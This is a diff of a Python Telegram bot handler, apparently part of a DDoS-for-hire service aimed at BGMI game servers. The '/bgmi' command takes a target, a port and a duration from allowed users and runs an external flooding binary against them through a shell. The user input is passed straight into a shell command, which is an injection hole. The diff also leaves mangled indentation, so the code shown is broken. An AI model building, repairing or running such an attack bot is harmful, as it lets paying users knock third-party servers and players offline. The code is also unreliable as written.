@@ -253,33 +253,30 @@ COOLDOWN_TIME = 0  # 0 minute cooldown
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
+
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = "You Are On Cooldown ❌. Please Wait 3min Before Running The /bgmi Command Again."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 241:
-                response = "Error: Time interval must be less than 240."
+    # Check if user is allowed to run the command and has access
+    if user_id in allowed_user_ids and check_access(user_id):
+        # Check if the user is not on cooldown
+        if user_id not in bgmi_cooldown or (datetime.datetime.now() - bgmi_cooldown[user_id]).total_seconds() >= 0:
+            command = message.text.split()
+            if len(command) == 4:  # Updated to accept target, time, and port
+                target = command[1]
+                port = int(command[2])  # Convert time to integer
+                time = int(command[3])  # Convert port to integer
+                if time > 241:
+                    response = "Error: Time interval must be less than 240."
+                else:
+                    record_command_logs(user_id, '/bgmi', target, port, time)
+                    log_command(user_id, target, port, time)
+                    start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                    full_command = f"./bgmi {target} {port} {time} 500"
+                    subprocess.run(full_command, shell=True)
+                    response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
             else:
-                record_command_logs(user_id, 'bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"python bgmi.py {target} {port} {time}"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
-        else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+                response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
             
             # Update last command time for the user
             bgmi_cooldown[user_id] = datetime.datetime.now()
